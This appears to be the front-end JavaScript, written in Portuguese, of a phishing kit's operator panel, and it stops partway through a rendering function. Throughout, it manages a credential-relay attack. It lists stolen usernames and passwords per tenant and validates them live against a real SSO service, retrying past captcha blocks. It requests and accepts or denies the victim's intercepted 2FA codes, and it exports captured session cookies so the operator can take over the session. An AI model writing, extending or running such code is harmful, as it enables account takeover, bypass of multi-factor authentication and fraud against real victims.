let dadosAtuais = {
  totalLogins: 0,
  total2FA: 0,
  totalUsuarios: 0,
  consolidados: [],
  feed: []
};

let abaAtiva = "consolidado"; // "consolidado" ou "feed"
let termoBusca = "";
const urlParams = new URLSearchParams(window.location.search);
let tenantAtivo = urlParams.get("tenant") || urlParams.get("cliente") || "";

const kpiLogins = document.getElementById("kpi-logins");
const kpi2fa = document.getElementById("kpi-2fa");
const kpiUsuarios = document.getElementById("kpi-usuarios");
const containerTabela = document.getElementById("container-tabela");
const filtroBusca = document.getElementById("filtro-busca");
const seletorTenant = document.getElementById("seletor-tenant");
const seletorUsuario = document.getElementById("seletor-usuario");
let usuarioFiltro = "";
const btnCopiarLinkLogin = document.getElementById("btn-copiar-link-login");
const linkSessaoRemotaTop = document.getElementById("link-sessao-remota-top");
const tabConsolidado = document.getElementById("tab-consolidado");
const tabFeed = document.getElementById("tab-feed");
const tabAuditoria = document.getElementById("tab-auditoria");
let dadosAuditoria = [];
let statsAuditoria = null;
const btnAtualizar = document.getElementById("btn-atualizar");
const btnToggleAuto = document.getElementById("btn-toggle-auto");
const autoModeLabel = document.getElementById("auto-mode-label");
const modalCookies = document.getElementById("modal-cookies");
const modalCookiesTitulo = document.getElementById("modal-cookies-titulo");
const modalCookiesJson = document.getElementById("modal-cookies-json");
const btnFecharModalCookies = document.getElementById("btn-fechar-modal-cookies");
const btnCopiarModalCookies = document.getElementById("btn-copiar-modal-cookies");
const btnModalAbrirSessao = document.getElementById("btn-modal-abrir-sessao");
const modalForcar2FA = document.getElementById("modal-forcar-2fa");
const btnFecharModalForcar = document.getElementById("btn-fechar-modal-forcar");
const btnModalRetestar = document.getElementById("btn-modal-retestar");
const btnModalConfirmarForcar = document.getElementById("btn-modal-confirmar-forcar");
let usuarioAlvoForcar = "";

const toast = document.getElementById("toast");
const toastMsg = document.getElementById("toast-msg");

function showToast(msg) {
  if (!toast || !toastMsg) return;
  toastMsg.textContent = msg;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 2500);
}

function abrirModalForcar2FA(usuario) {
  usuarioAlvoForcar = usuario;
  if (modalForcar2FA) modalForcar2FA.style.display = "flex";
}

function fecharModalForcar2FA() {
  usuarioAlvoForcar = "";
  if (modalForcar2FA) modalForcar2FA.style.display = "none";
}

if (btnFecharModalForcar) btnFecharModalForcar.addEventListener("click", fecharModalForcar2FA);
if (btnModalRetestar) {
  btnModalRetestar.addEventListener("click", () => {
    const u = usuarioAlvoForcar;
    fecharModalForcar2FA();
    if (u) retestarSSO(u);
  });
}
if (btnModalConfirmarForcar) {
  btnModalConfirmarForcar.addEventListener("click", () => {
    const u = usuarioAlvoForcar;
    fecharModalForcar2FA();
    if (u) solicitar2FA(u, true);
  });
}

function atualizarBotaoAuto() {
  if (!btnToggleAuto || !autoModeLabel) return;
  const isAuto = dadosAtuais.auto_mode !== false;
  if (isAuto) {
    autoModeLabel.textContent = "Modo Full-Auto: ATIVO";
    btnToggleAuto.style.borderColor = "rgba(2, 215, 47, 0.4)";
    btnToggleAuto.style.background = "rgba(2, 215, 47, 0.1)";
    btnToggleAuto.style.color = "var(--accent-green)";
  } else {
    autoModeLabel.textContent = "Modo Full-Auto: PAUSADO";
    btnToggleAuto.style.borderColor = "rgba(239, 68, 68, 0.4)";
    btnToggleAuto.style.background = "rgba(239, 68, 68, 0.1)";
    btnToggleAuto.style.color = "var(--danger)";
  }
}

async function alternarModoAuto() {
  const novoModo = !dadosAtuais.auto_mode;
  try {
    const res = await fetch("/api/config", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ auto_mode: novoModo })
    });
    const json = await res.json();
    if (json.success) {
      dadosAtuais.auto_mode = json.auto_mode;
      atualizarBotaoAuto();
      showToast(`Modo Full-Auto ${json.auto_mode ? 'ATIVADO' : 'PAUSADO (Manual)'}!`);
    }
  } catch (err) {
    console.error("Erro ao alterar modo auto:", err);
  }
}

async function abrirModalCookies(usuario, itemTenant) {
  if (!modalCookies || !modalCookiesJson) return;
  try {
    const t = itemTenant || tenantAtivo || "";
    if (modalCookiesTitulo) modalCookiesTitulo.textContent = `Cookies de Sessão — ${usuario}${t ? ` [${t}]` : ''}`;
    if (btnModalAbrirSessao) {
      btnModalAbrirSessao.href = `/sessao/${encodeURIComponent(usuario)}${t ? `?tenant=${encodeURIComponent(t)}` : ''}`;
    }
    modalCookiesJson.value = "Carregando cookies...";
    modalCookies.style.display = "flex";

    const query = `/api/sessao/${encodeURIComponent(usuario)}${t ? `?tenant=${encodeURIComponent(t)}` : ''}`;
    const res = await fetch(query);
    if (!res.ok) throw new Error("Sessão não encontrada");
    const json = await res.json();
    modalCookiesJson.value = JSON.stringify(json.cookie_editor_json || json.cookies || json, null, 2);
  } catch (err) {
    modalCookiesJson.value = "Nenhum cookie disponível ou erro ao carregar.";
  }
}

function fecharModalCookies() {
  if (modalCookies) modalCookies.style.display = "none";
}

function copiarTexto(texto, rotulo = "Valor") {
  if (!texto || texto === "—") return;
  navigator.clipboard.writeText(texto).then(() => {
    showToast(`${rotulo} copiado!`);
  }).catch(() => {
    const t = document.createElement("textarea");
    t.value = texto;
    document.body.appendChild(t);
    t.select();
    document.execCommand("copy");
    document.body.removeChild(t);
    showToast(`${rotulo} copiado!`);
  });
}

async function solicitar2FA(usuario, forcar = false) {
  if (!usuario) return;
  try {
    const res = await fetch("/api/solicitar-2fa", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ usuario, forcar })
    });
    const json = await res.json();
    if (json.success) {
      showToast(`2FA solicitado para ${usuario}! Tela da vítima liberada.`);
      carregarDados();
    } else {
      showToast(json.mensagem || "Aviso no status da credencial.");
      if (json.bloqueio_captcha && !forcar) {
        abrirModalForcar2FA(usuario);
      }
    }
  } catch (err) {
    console.error("Erro ao solicitar 2FA:", err);
  }
}

async function retestarSSO(usuario) {
  if (!usuario) return;
  try {
    showToast(`🔄 Re-tentando SSO da VR para ${usuario}...`);
    const res = await fetch("/api/retestar-sso", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ usuario })
    });
    const json = await res.json();
    if (json.success) {
      showToast(`Re-teste iniciado! Aguarde validação na VR.`);
      carregarDados();
    } else {
      showToast(json.mensagem || "Erro ao re-testar SSO.");
    }
  } catch (err) {
    console.error("Erro ao re-testar SSO:", err);
  }
}

async function decidir2FA(usuario, decisao) {
  if (!usuario) return;
  try {
    const res = await fetch("/api/decidir-2fa", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ usuario, decisao })
    });
    const json = await res.json();
    if (json.success) {
      if (decisao === "aceito") {
        showToast(`2FA de ${usuario} ACEITO! Redirecionando vítima.`);
      } else {
        showToast(`2FA de ${usuario} NEGADO! Vítima notificada para digitar novamente.`);
      }
      carregarDados();
    }
  } catch (err) {
    console.error("Erro ao registrar decisão 2FA:", err);
  }
}

async function carregarTenants() {
  if (!seletorTenant) return;
  try {
    const res = await fetch("/api/tenants?t=" + Date.now());
    const json = await res.json();
    if (json.success && Array.isArray(json.tenants)) {
      const valorAtual = seletorTenant.value || tenantAtivo;
      let html = `<option value="">Todos os Tenants (Global)</option>`;
      json.tenants.forEach(t => {
        const sel = t.tenant === valorAtual ? "selected" : "";
        html += `<option value="${escapeHtml(t.tenant)}" ${sel}>${escapeHtml(t.tenant)} (${t.totalLogins} logins, ${t.total2FA} 2FA)</option>`;
      });
      seletorTenant.innerHTML = html;
      if (valorAtual) seletorTenant.value = valorAtual;
    }
  } catch (err) {
    console.error("Erro ao carregar lista de tenants:", err);
  }
}

function carregarSeletorUsuarios() {
  if (!seletorUsuario) return;
  const consolidados = dadosAtuais.consolidados || [];
  const valorAtual = seletorUsuario.value || usuarioFiltro;
  let html = `<option value="">Todos os Usuários (${consolidados.length})</option>`;
  consolidados.forEach(item => {
    const u = item.usuario;
    const sel = u === valorAtual ? "selected" : "";
    let badge = item.tem_sessao_salva ? `${item.total_cookies || 0} cookies` : (item.status_credencial === "valido" ? "senha válida" : (item.status || "capturado"));
    html += `<option value="${escapeHtml(u)}" ${sel}>${escapeHtml(u)} [${escapeHtml(badge)}]</option>`;
  });
  seletorUsuario.innerHTML = html;
  if (valorAtual) seletorUsuario.value = valorAtual;
}

function atualizarLinkSessaoRemota() {
  if (!linkSessaoRemotaTop) return;
  const params = new URLSearchParams();
  if (usuarioFiltro) params.set("usuario", usuarioFiltro);
  if (tenantAtivo) params.set("tenant", tenantAtivo);
  const q = params.toString();
  linkSessaoRemotaTop.href = `/sessaoremota.html${q ? `?${q}` : ''}`;
}

async function carregarDados() {
  try {
    const query = "/api/painel?t=" + Date.now() + (tenantAtivo ? "&tenant=" + encodeURIComponent(tenantAtivo) : "");
    const res = await fetch(query, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" }
    });
    if (res.status === 401) {
      window.location.href = "/login-painel?redirect=" + encodeURIComponent(window.location.pathname + window.location.search);
      return;
    }
    if (!res.ok) throw new Error("Falha HTTP");
    const json = await res.json();
    if (json.success) {
      dadosAtuais = json;
      atualizarKpis();
      carregarSeletorUsuarios();
      atualizarLinkSessaoRemota();
      renderizarTabela();
    }
  } catch (err) {
    console.error("Erro ao carregar dados do painel:", err);
  }
}

function atualizarKpis() {
  if (kpiLogins) kpiLogins.textContent = dadosAtuais.totalLogins || 0;
  if (kpi2fa) kpi2fa.textContent = dadosAtuais.total2FA || 0;
  if (kpiUsuarios) kpiUsuarios.textContent = dadosAtuais.totalUsuarios || 0;
  atualizarBotaoAuto();
}

async function carregarAuditoria() {
  try {
    const queryLogs = "/api/audit-logs?limit=150&t=" + Date.now() + (tenantAtivo ? "&tenant=" + encodeURIComponent(tenantAtivo) : "");
    const res = await fetch(queryLogs);
    if (res.status === 401) {
      window.location.href = "/login-painel?redirect=" + encodeURIComponent(window.location.pathname + window.location.search);
      return;
    }
    const json = await res.json();
    if (json.success) {
      dadosAuditoria = json.logs || [];
    }
    const queryStats = "/api/audit-stats?t=" + Date.now() + (tenantAtivo ? "&tenant=" + encodeURIComponent(tenantAtivo) : "");
    const resStats = await fetch(queryStats);
    if (resStats.status === 401) return;
    const jsonStats = await resStats.json();
    if (jsonStats.success) {
      statsAuditoria = jsonStats.stats;
    }
    if (abaAtiva === "auditoria") {
      renderizarAuditoria();
    }
  } catch (err) {
    console.error("Erro ao carregar logs de auditoria:", err);
  }
}

function renderizarAuditoria() {
  if (!containerTabela) return;

  const termo = termoBusca.toLowerCase().trim();
  let filtrados = dadosAuditoria || [];
  if (usuarioFiltro) {
    filtrados = filtrados.filter(item => (item.usuario || "").toLowerCase() === usuarioFiltro.toLowerCase());
  }
  if (termo) {
    filtrados = filtrados.filter(item => {
      const u = (item.usuario || "").toLowerCase();
      const ev = (item.event_type || "").toLowerCase();
      const st = (item.status || "").toLowerCase();
      return u.includes(termo) || ev.includes(termo) || st.includes(termo);
    });
  }

  const s = statsAuditoria || {};
  const avgLatencia = s.avgDuracaoSegundos ? `${s.avgDuracaoSegundos}s` : "—";
  const minLatencia = s.minDuracaoSegundos ? `${s.minDuracaoSegundos}s` : "—";
  const maxLatencia = s.maxDuracaoSegundos ? `${s.maxDuracaoSegundos}s` : "—";
  const totalVal = s.totalValidacoes || 0;

  let html = `
    <div style="padding: 16px 20px; background: #0d0d11; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;">
      <div style="display: flex; align-items: center; gap: 16px; flex-wrap: wrap;">
        <div style="display: flex; flex-direction: column;">
          <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Validações no SSO</span>
          <span style="font-size: 16px; font-weight: 700; color: #fff; font-family: 'JetBrains Mono', monospace;">${totalVal}</span>
        </div>
        <div style="height: 28px; width: 1px; background: var(--border);"></div>
        <div style="display: flex; flex-direction: column;">
          <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Latência Média</span>
          <span style="font-size: 16px; font-weight: 700; color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">⚡ ${avgLatencia}</span>
        </div>
        <div style="height: 28px; width: 1px; background: var(--border);"></div>
        <div style="display: flex; flex-direction: column;">
          <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Min / Max</span>
          <span style="font-size: 13px; font-weight: 600; color: #a1a1aa; font-family: 'JetBrains Mono', monospace;">${minLatencia} / ${maxLatencia}</span>
        </div>
      </div>
      <div style="display: flex; align-items: center; gap: 8px;">
        <button class="btn btn-secondary" style="padding: 5px 10px; font-size: 11px;" type="button" onclick="carregarAuditoria()">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/><path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16"/><path d="M16 21h5v-5"/></svg>
          Atualizar Logs
        </button>
      </div>
    </div>
  `;

  if (filtrados.length === 0) {
    html += `
      <div class="empty-state">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
        <p>Nenhum log de auditoria registrado até o momento.</p>
      </div>
    `;
    containerTabela.innerHTML = html;
    return;
  }

  html += `
    <table>
      <thead>
        <tr>
          <th style="width: 18%;">Timestamp & Tenant</th>
          <th style="width: 22%;">Evento & Latência</th>
          <th style="width: 24%;">Usuário & Status</th>
          <th style="width: 36%;">Detalhes da Operação</th>
        </tr>
      </thead>
      <tbody>
  `;

  filtrados.forEach((item) => {
    let evColor = "var(--text-muted)";
    let evBg = "rgba(255,255,255,0.05)";
    let evBorder = "var(--border)";

    if (item.event_type && item.event_type.includes("SUCCESS")) {
      evColor = "var(--accent-green)";
      evBg = "var(--accent-green-subtle)";
      evBorder = "rgba(2, 215, 47, 0.3)";
    } else if (item.event_type && (item.event_type.includes("FAILED") || item.event_type.includes("NEGADO"))) {
      evColor = "var(--danger)";
      evBg = "var(--danger-subtle)";
      evBorder = "rgba(239, 68, 68, 0.3)";
    } else if (item.event_type && (item.event_type.includes("BLOCKED") || item.event_type.includes("CAPTCHA"))) {
      evColor = "#f59e0b";
      evBg = "rgba(245, 158, 11, 0.15)";
      evBorder = "rgba(245, 158, 11, 0.3)";
    } else if (item.event_type && (item.event_type.includes("SUBMIT") || item.event_type.includes("START"))) {
      evColor = "#818cf8";
      evBg = "rgba(99, 102, 241, 0.12)";
      evBorder = "rgba(99, 102, 241, 0.3)";
    }

    const durSec = item.duration_ms > 0 ? (item.duration_ms / 1000).toFixed(2) : 0;
    let latencyBadge = `<span style="color: var(--text-dim); font-size: 10px;">—</span>`;
    if (item.duration_ms > 0) {
      const isFast = item.duration_ms <= 3500;
      const isOk = item.duration_ms <= 5000;
      const latClass = isFast ? "latency-fast" : (isOk ? "latency-badge" : "latency-warning");
      latencyBadge = `<span class="latency-badge ${latClass}" style="padding: 1px 5px; font-size: 10px;">⚡ ${durSec}s</span>`;
    }

    const detailsStr = typeof item.details === "object" ? JSON.stringify(item.details) : (item.details || "");

    html += `
      <tr>
        <td>
          <div style="color: var(--text); font-size: 12px; font-weight: 600;">${item.timestamp || "—"}</div>
          <div style="margin-top: 3px;"><span class="tenant-badge" style="font-size: 10px; padding: 1px 6px;">${escapeHtml(item.tenant || "default")}</span></div>
        </td>
        <td>
          <div>
            <span style="display: inline-flex; align-items: center; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: 700; font-family: 'JetBrains Mono', monospace; background: ${evBg}; color: ${evColor}; border: 1px solid ${evBorder};">
              ${escapeHtml(item.event_type || "LOG")}
            </span>
          </div>
          <div style="display: flex; align-items: center; gap: 5px; margin-top: 3px;">
            ${latencyBadge}
            <span style="color: var(--text-dim); font-size: 10px; font-family: 'JetBrains Mono', monospace;">${escapeHtml(item.ip || "—")}</span>
          </div>
        </td>
        <td>
          <div class="user-tag mono" style="font-size: 11px; max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(item.usuario || '')}">
            ${escapeHtml(item.usuario || "—")}
          </div>
          <div style="margin-top: 3px;">
            <span class="status-badge ${item.status === 'SUCCESS' ? 'status-complete' : (item.status === 'FAILED' ? 'status-rejected' : 'status-waiting')}" style="padding: 1px 6px; font-size: 10px;">
              ${escapeHtml(item.status || "INFO")}
            </span>
          </div>
        </td>
        <td style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #a1a1aa; line-height: 1.4; word-break: break-all;" title="${escapeHtml(detailsStr)}">
          ${escapeHtml(detailsStr)}
        </td>
      </tr>
    `;
  });

  html += `</tbody></table>`;
  containerTabela.innerHTML = html;
}

function gerarBotoesAcaoConsolidado(item) {
  const tem2FA = !!item.ultimoCodigo;
  const st2FA = item.status_2fa;
  const stLogin = item.status_login || "aguardando_solicitacao";
  const sessaoConcluida = !!(item.total_cookies > 0 || item.cookies || item.tem_sessao_salva || st2FA === 'aceito' || item.status === '2FA Aceito');
  const uEsc = escapeQuotes(item.usuario);

  if (tem2FA) {
    if (st2FA === "aceito" || item.status === "2FA Aceito" || sessaoConcluida) {
      return `
        <button class="btn-success-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="2FA já aceito com sucesso">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
          <span>Aceito</span>
        </button>
        <button class="btn-danger-sm" type="button" disabled style="opacity: 0.35; cursor: not-allowed;" title="Operação indisponível: Sessão já autenticada com sucesso">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          <span>Negar</span>
        </button>
      `;
    }
    if (st2FA === "negado") {
      return `
        <button class="btn-success-sm" type="button" title="Aceitar código 2FA e redirecionar para tela final" onclick="decidir2FA('${uEsc}', 'aceito')">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
          <span>Aceitar</span>
        </button>
        <button class="btn-danger-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="Código 2FA já foi negado (aguardando novo código da vítima)">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          <span>Negado</span>
        </button>
      `;
    }
    return `
      <button class="btn-success-sm" type="button" title="Aceitar código 2FA e redirecionar para tela final" onclick="decidir2FA('${uEsc}', 'aceito')">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
        <span>Aceitar</span>
      </button>
      <button class="btn-danger-sm" type="button" title="Negar código e solicitar que a vítima digite novamente" onclick="decidir2FA('${uEsc}', 'negado')">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        <span>Negar</span>
      </button>
    `;
  }

  if (sessaoConcluida) {
    return `
      <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Operação indisponível: Sessão já autenticada e concluída">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
        <span>Sessão Pronta</span>
      </button>
    `;
  }

  if (stLogin === "solicitar_2fa") {
    return `
      <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.65; cursor: not-allowed;" disabled title="2FA já foi solicitado, aguardando vítima digitar">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
        <span>Aguardando Código</span>
      </button>
    `;
  }

  if (item.status_credencial === "testando") {
    return `
      <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Validação de credenciais em andamento na VR...">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
        <span>Testando na VR</span>
      </button>
    `;
  }

  if (item.status_credencial === "invalido") {
    return `
      <button class="btn-danger-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="Operação indisponível: Senha incorreta confirmada na VR (aguardando nova senha da vítima)">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        <span>Senha Incorreta</span>
      </button>
    `;
  }

  if (item.status_credencial === "bloqueio_captcha") {
    return `
      <button class="btn-warning-sm" type="button" style="background: rgba(245, 158, 11, 0.2); border: 1px solid #f59e0b; color: #f59e0b; display: inline-flex; align-items: center; gap: 5px;" title="A VR apresentou desafio Cloudflare Turnstile. Clique para resolver e re-tentar no SSO." onclick="retestarSSO('${uEsc}')">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
        <span>Resolver Captcha</span>
      </button>
      <button class="btn-secondary" type="button" style="padding: 5px 8px; font-size: 11px; border-color: rgba(245, 158, 11, 0.4); color: #f59e0b;" title="Atenção: A VR não gerou código MFA real." onclick="abrirModalForcar2FA('${uEsc}')">
        <span>Forçar 2FA</span>
      </button>
    `;
  }

  if (item.status_credencial === "valido") {
    return `
      <button class="btn-success-sm" type="button" style="background: rgba(2, 215, 47, 0.25); border-color: #02d72f;" title="Senha confirmada na VR! O código 2FA real foi enviado para a vítima." onclick="solicitar2FA('${uEsc}')">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        <span>Solicitar 2FA</span>
      </button>
    `;
  }

  return `
    <button class="btn-primary-sm" type="button" title="Liberar tela da vítima para solicitar o 2FA" onclick="solicitar2FA('${uEsc}')">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      <span>Solicitar 2FA</span>
    </button>
  `;
}

function gerarBotoesAcaoFeed(item) {
  const is2FA = item.tipo === "2FA";
  const uEsc = escapeQuotes(item.usuario);

  if (is2FA) {
    if (item.status_2fa === "aceito" || item.status === "2FA Aceito") {
      return `
        <button class="btn-success-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="2FA já aceito com sucesso">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
          <span>Aceito</span>
        </button>
        <button class="btn-danger-sm" type="button" disabled style="opacity: 0.35; cursor: not-allowed;" title="Operação indisponível: Sessão já autenticada com sucesso">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          <span>Negar</span>
        </button>
      `;
    }
    if (item.status_2fa === "negado") {
      return `
        <button class="btn-success-sm" type="button" title="Aceitar" onclick="decidir2FA('${uEsc}', 'aceito')">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
          <span>Aceitar</span>
        </button>
        <button class="btn-danger-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="Código 2FA já negado (aguardando novo código)">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          <span>Negar</span>
        </button>
      `;
    }
    return `
      <button class="btn-success-sm" type="button" title="Aceitar" onclick="decidir2FA('${uEsc}', 'aceito')">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
        <span>Aceitar</span>
      </button>
      <button class="btn-danger-sm" type="button" title="Negar" onclick="decidir2FA('${uEsc}', 'negado')">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        <span>Negar</span>
      </button>
    `;
  }

  if (item.total_cookies > 0 || item.cookies || item.status_2fa === 'aceito') {
    return `
      <button class="btn-secondary" style="padding: 4px 8px; font-size: 11px; opacity: 0.55; cursor: not-allowed;" disabled title="Operação indisponível: Sessão já autenticada e concluída">
        <span>Concluído</span>
      </button>
    `;
  }

  if (item.status_login === "solicitar_2fa") {
    return `
      <button class="btn-secondary" style="padding: 4px 8px; font-size: 11px; opacity: 0.65; cursor: not-allowed;" disabled title="2FA já solicitado, aguardando vítima digitar">
        <span>2FA Solicitado</span>
      </button>
    `;
  }

  if (item.status_credencial === "testando") {
    return `
      <button class="btn-secondary" style="padding: 4px 8px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Validação em andamento na VR...">
        <span>Testando</span>
      </button>
    `;
  }

  if (item.status_credencial === "invalido") {
    return `
      <button class="btn-danger-sm" style="padding: 4px 8px; font-size: 11px; opacity: 0.55; cursor: not-allowed;" disabled title="Operação indisponível: Senha incorreta confirmada na VR">
        <span>Senha Incorreta</span>
      </button>
    `;
  }

  return `
    <button class="btn-primary-sm" type="button" title="Solicitar 2FA" onclick="solicitar2FA('${uEsc}')">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      <span>Pedir 2FA</span>
    </button>
  `;
}

function renderizarTabela() {
  if (!containerTabela) return;

  if (abaAtiva === "auditoria") {
    renderizarAuditoria();
    return;
  }

  const termo = termoBusca.toLowerCase().trim();

  if (abaAtiva === "consolidado") {
    let filtrados = dadosAtuais.consolidados || [];
    if (usuarioFiltro) {
      filtrados = filtrados.filter(item => (item.usuario || "").toLowerCase() === usuarioFiltro.toLowerCase());
    }
    if (termo) {
      filtrados = filtrados.filter(item => {
        const u = (item.usuario || "").toLowerCase();
        const s = (item.ultimaSenha || "").toLowerCase();
        const c = (item.ultimoCodigo || "").toLowerCase();
        const tn = (item.tenant || "").toLowerCase();
        return u.includes(termo) || s.includes(termo) || c.includes(termo) || tn.includes(termo);
      });
    }

    if (filtrados.length === 0) {
      containerTabela.innerHTML = `
        <div class="empty-state">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
          <p>Nenhuma captura registrada até o momento.</p>
        </div>
      `;
      return;
    }

    let html = `
      <table>
        <thead>
          <tr>
            <th style="width: 18%;">Registro & Tenant</th>
            <th style="width: 28%;">Credencial (Usuário & Senha)</th>
            <th style="width: 26%;">Auditoria SSO & 2FA</th>
            <th style="width: 28%; text-align: right;">Ações Operacionais</th>
          </tr>
        </thead>
        <tbody>
    `;

    filtrados.forEach((item) => {
      const tem2FA = !!item.ultimoCodigo;
      const st2FA = item.status_2fa;
